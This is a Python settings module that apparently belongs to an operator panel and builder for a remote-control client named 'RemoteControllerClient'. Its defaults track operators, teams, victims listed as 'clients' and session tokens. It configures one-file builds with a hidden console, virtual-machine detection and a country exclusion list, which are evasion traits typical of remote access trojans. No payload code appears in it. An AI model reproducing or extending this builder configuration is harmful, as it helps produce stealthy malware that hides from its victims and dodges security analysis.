import json


DEFAULT_CLIENTS = []

DEFAULT_TEAMS = []

DEFAULT_OPERATORS = []

DEFAULT_SETTINGS = {
    "theme": "dark",
    "language": "en",
    "role": "operator",
    "remember_me": False,
    "account_id": "",
    "operator_name": "",
    "operator_team_id": "",
    "session_token": "",
    "recent_account_ids": [],
    "session_logs": [],
    "teams": DEFAULT_TEAMS,
    "operators": DEFAULT_OPERATORS,
    "clients": DEFAULT_CLIENTS,
    "builder": {
        "source_dir": "",
        "entrypoint": "",
        "output_name": "RemoteControllerClient",
        "antifraud": {
            "vm": True,
            "region": True,
            "countries": [
                "AM",
                "AZ",
                "BY",
                "GE",
                "KZ",
                "KG",
                "MD",
                "RU",
                "TJ",
                "TM",
                "UA",
                "UZ",
                "CN",
                "IN",
            ],
        },
        "output_dir": "",
        "icon_path": "",
        "mode": "onefile",
        "console": "hide",
    },
}


def deep_copy(value):
    return json.loads(json.dumps(value))
